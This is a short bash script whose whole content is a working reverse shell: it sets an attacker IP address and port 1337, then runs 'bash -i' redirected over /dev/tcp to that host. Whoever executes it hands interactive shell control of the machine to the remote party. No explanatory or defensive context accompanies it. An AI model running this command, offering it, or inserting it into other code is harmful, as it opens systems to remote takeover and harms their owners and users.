#!/usr/bin/env bash
ATTACKER_IP="4.227.15.124"
ATTACKER_PORT="1337"

# Reverse shell command:
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
